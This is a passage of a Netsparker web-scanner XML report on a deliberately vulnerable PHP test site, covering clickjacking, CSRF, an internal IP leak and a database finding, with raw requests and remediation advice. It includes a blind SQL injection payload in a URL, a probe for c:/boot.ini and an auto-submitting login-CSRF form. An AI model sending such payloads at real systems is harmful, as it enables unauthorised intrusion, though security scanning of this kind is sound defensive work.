					<rawrequest>&lt;![CDATA[GET /process.php?file=Generics/contact.nsp HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;ef=&quot;/process.php?file=Generics/contact.nsp&quot;&gt;Contact &lt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;

			&lt;iframe width=&quot;540&quot; height=&quot;350&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; marginheight=&quot;0&quot;
				style=&quot;float: left&quot; marginwidth=&quot;0&quot; &lt;span class=&quot;highlight&quot;&gt;src=&quot;http://maps.google.com/maps?q=mavituna+security&amp;output=embed&quot;&lt;/span&gt;&gt;
			&lt;/iframe&gt;




  &lt;strong&gt;&lt;br /&gt;Test&amp;Demonstration Site Ltd
   &lt;br /&gt;(reg. no. 123456)&lt;/strong&gt;&lt;br /&gt;
   &lt;p&gt;
    Green House,
    3478 Stone QX
    Dos Tringulas
    EK7 AP0&lt;br /&gt;

â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Frame Source(s)">&lt;![CDATA[http://maps.google.com/maps?q=mavituna+security&amp;output=embed]]&gt;</info>
							<info name="Parsing Source">&lt;![CDATA[DOM Parser]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>MissingXFrameOptionsHeader</type>
					<severity>Low</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected a missing &lt;code&gt;X-Frame-Options&lt;/code&gt; header which means that this website could be at risk of a clickjacking attack.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;X-Frame-Options&lt;/code&gt; HTTP header field indicates a policy that specifies whether the browser should render the transmitted resource within a &lt;code&gt;frame&lt;/code&gt; or an &lt;code&gt;iframe&lt;/code&gt;. Servers can declare this policy in the header of their HTTP responses to prevent clickjacking attacks, which ensures that their content is not embedded into other pages or frames.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;
&lt;p&gt;Clickjacking is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on a&#160;framed&#160;page when they were intending to click on the top level page. Thus, the attacker is &quot;hijacking&quot; clicks meant for their page and routing them to other another page, most likely owned by another application, domain, or both.&lt;/p&gt;
&lt;p&gt;Using a similar technique, keystrokes can also be hijacked. With a carefully crafted combination of stylesheets, iframes, and text boxes, a user can be led to believe they are typing in the password to their email or bank account, but are instead typing into an invisible frame controlled by the attacker.&lt;/p&gt;
&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Sending the proper X-Frame-Options in HTTP response headers that instruct the browser to not allow framing from other domains.&lt;/span&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&lt;code&gt;X-Frame-Options: DENY&lt;/code&gt;&#160; It completely denies to be loaded in frame/iframe.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&lt;code&gt;X-Frame-Options: SAMEORIGIN&lt;/code&gt; It allows only if the site which wants to load has a same origin.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&lt;code&gt;X-Frame-Options: ALLOW-FROM &lt;em&gt;URL&lt;/em&gt;&lt;/code&gt; It grants a specific URL to load itself in a iframe. However please pay attention to that, not all browsers support this. &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Employing defensive code in the UI to ensure that the current frame is the most top level window.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Clickjacking&#39;&gt;Clickjacking&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://caniuse.com/#search=X-Frame-Options&#39;&gt;Can I Use X-Frame-Options&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet&#39;&gt;Clickjacking Defense Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC></WASC>
							<CWE>693</CWE>
							<CAPEC>103</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/nslookup.php</url>
					<type>InternalIPLeakage</type>
					<severity>Low</severity>
					<certainty>50</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a possible internal IP address disclosure in the page.&lt;/p&gt;&lt;p&gt;It was not determined if the IP address was that of the system itself or that of an internal network.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;There is no direct impact; however, this information can help an attacker identify other vulnerabilities or help during the exploitation of other identified vulnerabilities.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;First, ensure this is not a false positive. Due to the nature of the issue, Netsparker could not confirm that this IP address was actually the real internal IP address of the target web server or internal network. If it is, consider removing it.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[POST /nslookup.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 7
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/nslookup.php
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

param=3]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;label&quot; style=&quot;width: 89px&quot;&gt;&lt;/td&gt;
                &lt;td class=&quot;style1&quot; colspan=&quot;2&quot;&gt;
                &lt;/td&gt;
            &lt;/tr&gt;
        &lt;/table&gt;
                    &lt;/form&gt;
  &lt;pre&gt;Server:  UnKnown
Address:  &lt;span class=&quot;highlight&quot;&gt;172.30.0.2&lt;/span&gt;

&lt;/pre&gt;					&lt;/p&gt;
				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/div&gt;
		&lt;!-- end #content --&gt;

	&lt;div id=&quot;sidebar&quot;&gt;
			&lt;ul&gt;
				&lt;li&gt;
					&lt;div id=&quot;search&quot; &gt;
						&lt;form met
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="ExtractedIPAddresses">&lt;![CDATA[172.30.0.2]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE>200</CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/nslookup.php</url>
					<type>CsrfDetected</type>
					<severity>Low</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a possible Cross-Site Request Forgery.&lt;/p&gt;&lt;p&gt;CSRF is a very common vulnerability. It&#39;s an attack which forces a user to execute unwanted actions on a web application in which the user is currently authenticated.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;Depending on the application, an attacker can mount any of the actions that can be done by the user such as adding a user, modifying content, deleting data. All the functionality thatâ€™s available to the victim can be used by the attacker. Only exception to this rule is a page that requires extra information that only the legitimate user can know (such as userâ€™s password).&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Send additional information in each HTTP request that can be used to determine whether the request came from an authorized source. This &quot;validation token&quot; should be hard to guess for attacker who does not already have access to the user&#39;s account. If a request is missing a validation token or the token does not match the expected value, the server should reject the request.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;If you are posting form in ajax request, custom HTTP headers can be used to prevent CSRF because the browser prevents sites from sending custom HTTP headers to another site but allows sites to send custom HTTP headers to themselves using XMLHttpRequest.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;For native XMLHttpRequest (XHR) object in JavaScript;&lt;pre&gt;xhr = new XMLHttpRequest();
xhr.setRequestHeader(&#39;custom-header&#39;, &#39;valueNULL);
&lt;/pre&gt;For JQuery, if you want to add a custom header (or set of headers) to&lt;p&gt;a. &lt;strong&gt;individual request&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;$.ajax({
    url: &#39;foo/bar&#39;,
    headers: { &#39;x-my-custom-header&#39;: &#39;some value&#39; }
});
&lt;/pre&gt;&lt;p&gt; &lt;br&gt;&lt;/p&gt;&lt;p&gt;b. &lt;strong&gt;every request&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;$.ajaxSetup({
    headers: { &#39;x-my-custom-header&#39;: &#39;some value&#39; }
});
OR
$.ajaxSetup({
    beforeSend: function(xhr) {
        xhr.setRequestHeader(&#39;x-my-custom-header&#39;, &#39;some value&#39;);
    }
});
&lt;/pre&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&#39;&gt;OWASP Cross-Site Request Forgery (CSRF)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet&#39;&gt;OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /nslookup.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 3783
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:35 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;script type=text/javascript src = &quot;&quot; &gt;&lt;/script&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
				&lt;h2 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Products &lt;/a&gt;&lt;/h2&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;
					&lt;p&gt;
                    &lt;form action=&quot;/nslookup.php&quot; method=&quot;POST&quot;&gt;
                           &lt;table class=&quot;databases&quot;&gt;
            &lt;tr&gt;
                &lt;td colspan=&quot;3&quot;&gt;
                &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class=&quot;label&quot; style=&quot;width: 89px&quot;&gt;
                    &lt;label&gt;IP Adress:&lt;/label&gt;&lt;/td&gt;
                &lt;td class=&quot;style3&quot;&gt;
                    &lt;input type=&quot;text&quot; size=&quot;40&quot; name=&quot;param&quot; id=&quot;param&quot; class=&quot;input&quot;/&gt;
                &lt;/td&gt;
                &lt;td class=&quot;style1&quot;&gt;
                    &lt;input type=&quot;submit&quot; value=&quot;GO&quot; class=&quot;button&quot; id=&quot;submit&quot;

â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Form Action(s)">&lt;![CDATA[/nslookup.php]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A8</OWASP2013>
							<WASC>9</WASC>
							<CWE>352</CWE>
							<CAPEC>62</CAPEC>
							<PCI31>6.5.9</PCI31>
							<PCI32>6.5.9</PCI32>
							<HIPAA>164.306(a)</HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/auth/login.php</url>
					<type>CsrfInLoginFormDetected</type>
					<severity>Low</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a possible Cross-Site Request Forgery in login form.&lt;/p&gt;&lt;p&gt;In a login CSRF attack, the attacker forges a login request to an honest site using the attackerâ€™s user name and password at that site. If the forgery succeeds, the honest server responds with a Set-Cookie header that instructs the browser to mutate its state by storing a session cookie, logging the user into the honest site as the attacker. This session cookie is used to bind subsequent requests to the userâ€™s session and hence to the attackerâ€™s authentication credentials. The attacker can later log into the site with his legitimate credentials and view private information like activity history that has been saved in the account.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;&lt;p&gt;In this particular case CSRF affects the login form in which the impact of this vulnerability is decreased significantly. Unlike normal CSRF vulnerabilities this will only allow an attacker to exploit some complex XSS vulnerabilities otherwise it can&#39;t be exploited.&lt;/p&gt;&lt;p&gt;For example;&lt;/p&gt;&lt;p&gt;If there is a page that&#39;s different for every user (such as &quot;edit my profile&quot;) and vulnerable to XSS (Cross-site Scripting) then normally it cannot be exploited. However if the login form is vulnerable, an attacker can prepare a special profile, force victim to login as that user which will trigger the XSS exploit. Again attacker is still quite limited with this XSS as there is no active session. However the attacker can leverage this XSS in many ways such as showing the same login form again but this time capturing and sending the entered username/password to the attacker.&lt;/p&gt;&lt;p&gt;In this kind of attack, attacker will send a link containing html as simple as the following in which attacker&#39;s user name and password is attached.&lt;/p&gt;&lt;pre&gt;&amp;lt;form method=&quot;POST&quot; action=&quot;http://honest.site/login&quot;&amp;gt;
  &amp;lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;h4ck3r&quot; /&amp;gt;
  &amp;lt;input type=&quot;password&quot; name=&quot;pass&quot; value=&quot;passw0rd&quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;script&amp;gt;
    document.forms[0].submit();
&amp;lt;/script&amp;gt;
    &lt;/pre&gt;&lt;p&gt;When the victim clicks the link then form will be submitted automatically to the honest site and exploitation is successful, victim will be logged in as the attacker and consequences will depend on the website behavior.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Search History&lt;/strong&gt;&lt;br&gt;&lt;p&gt;Many sites allow their users to opt-in to saving their search history and provide an interface for a user to review his or her personal search history. Search queries contain sensitive details about the userâ€™s interests and activities and could be used by the attacker to embarrass the user, to steal the userâ€™s identity, or to spy on the user. Since the victim logs in as the attacker, the victim&#39;s search queries are then stored in the attackerâ€™s search history, and the attacker can retrieve the queries by logging into his or her own account.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Shopping&lt;/strong&gt;&lt;br&gt;&lt;p&gt;Merchant sites might save the credit card details in user&#39;s profile. In login CSRF attack, when user funds a purchase and enrolls the credit card, the credit card details might be added to the attacker&#39;s account.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Send additional information in each HTTP request that can be used to determine whether the request came from an authorized source. This &quot;validation token&quot; should be hard to guess for attacker who does not already have access to the user&#39;s account. If a request is missing a validation token or the token does not match the expected value, the server should reject the request.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;If you are posting form in ajax request, custom HTTP headers can be used to prevent CSRF because the browser prevents sites from sending custom HTTP headers to another site but allows sites to send custom HTTP headers to themselves using XMLHttpRequest.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;For native XMLHttpRequest (XHR) object in JavaScript;&lt;pre&gt;xhr = new XMLHttpRequest();
xhr.setRequestHeader(&#39;custom-header&#39;, &#39;valueNULL);
&lt;/pre&gt;For JQuery, if you want to add a custom header (or set of headers) to&lt;p&gt;a. &lt;strong&gt;individual request&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;$.ajax({
    url: &#39;foo/bar&#39;,
    headers: { &#39;x-my-custom-header&#39;: &#39;some value&#39; }
});
&lt;/pre&gt;&lt;p&gt; &lt;br&gt;&lt;/p&gt;&lt;p&gt;b. &lt;strong&gt;every request&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;$.ajaxSetup({
    headers: { &#39;x-my-custom-header&#39;: &#39;some value&#39; }
});
OR
$.ajaxSetup({
    beforeSend: function(xhr) {
        xhr.setRequestHeader(&#39;x-my-custom-header&#39;, &#39;some value&#39;);
    }
});
&lt;/pre&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&#39;&gt;OWASP Cross-Site Request Forgery (CSRF)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://seclab.stanford.edu/websec/csrf/csrf.pdf&#39;&gt;Robust Defenses for Cross-Site Request Forgery&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.cs.uic.edu/~bprabaka/LoginCSRF.pdf&#39;&gt;Identifying Robust Defenses for Login CSRF&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet&#39;&gt;OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /auth/login.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/auth/
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;		&lt;div class=&quot;post&quot;&gt;
								&lt;h1 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Login Area&lt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;
                    Enter your credentials (admin / admin123456)
    &lt;br/&gt;
    &lt;form method=&quot;POST&quot; action=&quot;&lt;span class=&quot;highlight&quot;&gt;control.php&lt;/span&gt;&quot;&gt;
      Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;
      &lt;br/&gt;
      Password:&amp;nbsp;&amp;nbsp;&lt;input type=&quot;password&quot; name=&quot;password&quot;/&gt;
&lt;!-- Test credentials --&gt;
&lt;!-- Password: admin123456 --&gt;

â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Form Action(s)">&lt;![CDATA[control.php]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A8</OWASP2013>
							<WASC>9</WASC>
							<CWE>352</CWE>
							<CAPEC>62</CAPEC>
							<PCI31>6.5.9</PCI31>
							<PCI32>6.5.9</PCI32>
							<HIPAA>164.306(a)</HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/c:/boot.ini</url>
					<type>ForbiddenResource</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a forbidden resource.&lt;/p&gt;&lt;p&gt;Access to this resource has been denied by the web server. This is generally not a security issue, and is reported here for informational purposes.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;This issue is reported as additional information only. There is no direct impact arising from this issue.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[  ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /c:/boot.ini HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[&lt;span class=&quot;highlight&quot;&gt;HTTP/1.1 403 Forbidden
&lt;/span&gt;
Server: Apache/2.2.8 (Win32) PHP/5.2.6
Content-Length: 306
Content-Type: text/html; charset=iso-8859-1
Date: Fri, 29 Jun 2018 03:09:45 GMT

&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don&#39;t have permission to access /c:/boot.ini
on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.2.8 (Win32) PHP/5.2.6 Server at php.testsparker.com Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C8</OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/artist.php?id=-1%20OR%201%3d1))%20AND%20IFNULL(ASCII(SUBSTRING((SELECT%200x4E4554535041524B4552)%2c9%2c1))%2c0)%3d82--%20</url>
					<type>MySqlIdentified</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected the target website is using MySQL as its backend database.&lt;/p&gt;&lt;p&gt;This is generally not a security issue and is reported here for informational purposes only.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;This issue is reported as additional information only. There is no direct impact arising from this issue.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[  ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /artist.php?id=-1%20OR%201%3d1))%20AND%20IFNULL(ASCII(SUBSTRING((SELECT%200x4E4554535041524B4552)%2c9%2c1))%2c0)%3d82--%20 HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
